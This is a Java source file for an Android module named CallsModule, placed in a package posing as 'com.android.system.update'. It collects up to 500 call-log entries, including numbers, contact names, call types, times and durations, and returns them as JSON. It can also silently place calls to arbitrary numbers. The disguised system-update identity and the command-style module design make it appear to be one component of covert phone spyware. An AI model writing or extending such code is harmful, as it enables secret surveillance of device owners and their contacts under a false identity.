package com.android.system.update.modules;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsModule {
    private static final String TAG = "CallsModule";
    private final Context context;

    public CallsModule(Context context) {
        this.context = context;
    }

    // ── Retrieve call logs ────────────────────────────────────────────────────

    public String getCallLogs() {
        Log.d(TAG, "📞 getCallLogs() called");
        JSONArray callsArray = new JSONArray();

        try {
            ContentResolver resolver = context.getContentResolver();
            String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.CACHED_NUMBER_LABEL,
            };

            // Most-recent first, limit to 500 entries
            Cursor cursor = resolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 500"
            );

            if (cursor != null) {
                Log.d(TAG, "📞 Cursor count: " + cursor.getCount());

                int numberIdx   = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int nameIdx     = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int typeIdx     = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx     = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                while (cursor.moveToNext()) {
                    try {
                        String number   = numberIdx   >= 0 ? cursor.getString(numberIdx)   : "Unknown";
                        String name     = nameIdx     >= 0 ? cursor.getString(nameIdx)     : "";
                        int    type     = typeIdx     >= 0 ? cursor.getInt(typeIdx)         : 0;
                        long   date     = dateIdx     >= 0 ? cursor.getLong(dateIdx)        : 0L;
                        int    duration = durationIdx >= 0 ? cursor.getInt(durationIdx)     : 0;

                        String typeStr = callTypeToString(type);

                        JSONObject callObj = new JSONObject();
                        callObj.put("number",         number  != null ? number  : "Unknown");
                        callObj.put("name",           name    != null ? name    : "");
                        callObj.put("type",           typeStr);
                        callObj.put("date",           date);
                        callObj.put("duration",       String.valueOf(duration));
                        callObj.put("formatted_date", formatDate(date));

                        callsArray.put(callObj);
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing call log row", e);
                    }
                }
                cursor.close();
            } else {
                Log.w(TAG, "⚠️ Cursor is null — no READ_CALL_LOG permission?");
            }

            Log.d(TAG, "📞 Returning " + callsArray.length() + " call logs");
            return callsArray.toString();

        } catch (SecurityException se) {
            Log.e(TAG, "❌ SecurityException reading call log — missing permission", se);
            return "[{\"error\":\"Permission denied: READ_CALL_LOG\"}]";
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading call logs", e);
            return "[{\"error\":\"" + e.getMessage() + "\"}]";
        }
    }

    // ── Initiate a call ───────────────────────────────────────────────────────
    //
    // Uses ACTION_CALL which dials immediately (requires CALL_PHONE permission).
    // Falls back to ACTION_DIAL (opens the dialler) when permission is absent.

    public String makeCall(String number) {
        if (number == null || number.trim().isEmpty()) {
            Log.e(TAG, "❌ makeCall: empty number");
            return "ERROR: No number provided";
        }

        number = number.trim();
        Log.d(TAG, "📞 makeCall: " + number);

        try {
            Uri callUri = Uri.parse("tel:" + Uri.encode(number));

            // Prefer ACTION_CALL (silent dial) — needs CALL_PHONE permission
            Intent callIntent = new Intent(Intent.ACTION_CALL, callUri);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            // Check if we actually have the permission at runtime
            boolean hasPermission = context.checkSelfPermission(
                    android.Manifest.permission.CALL_PHONE)
                == android.content.pm.PackageManager.PERMISSION_GRANTED;

            if (!hasPermission) {
                Log.w(TAG, "⚠️ CALL_PHONE not granted — falling back to ACTION_DIAL");
                callIntent = new Intent(Intent.ACTION_DIAL, callUri);
                callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            }

            context.startActivity(callIntent);
            Log.d(TAG, "✅ Call intent launched for: " + number);
            return "SUCCESS: Calling " + number;

        } catch (SecurityException se) {
            Log.e(TAG, "❌ SecurityException launching call", se);
            // Last-resort: open dialler
            try {
                Intent dialIntent = new Intent(
                    Intent.ACTION_DIAL, Uri.parse("tel:" + Uri.encode(number)));
                dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(dialIntent);
                return "DIALLER_OPENED: " + number;
            } catch (Exception ex) {
                return "ERROR: " + ex.getMessage();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error making call: " + e.getMessage(), e);
            return "ERROR: " + e.getMessage();
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private String callTypeToString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:  return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE:  return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE:    return "MISSED";
            case CallLog.Calls.REJECTED_TYPE:  return "REJECTED";
            case CallLog.Calls.VOICEMAIL_TYPE: return "VOICEMAIL";
            case CallLog.Calls.BLOCKED_TYPE:   return "BLOCKED";
            // API 29+
            case 7:                            return "ANSWERED_EXTERNALLY";
            default:                           return "UNKNOWN";
        }
    }

    private String formatDate(long timestamp) {
        if (timestamp == 0) return "Unknown date";
        try {
            java.text.SimpleDateFormat sdf =
                new java.text.SimpleDateFormat("MMM dd, yyyy HH:mm",
                    java.util.Locale.getDefault());
            return sdf.format(new java.util.Date(timestamp));
        } catch (Exception e) {
            return "Unknown date";
        }
    }
}
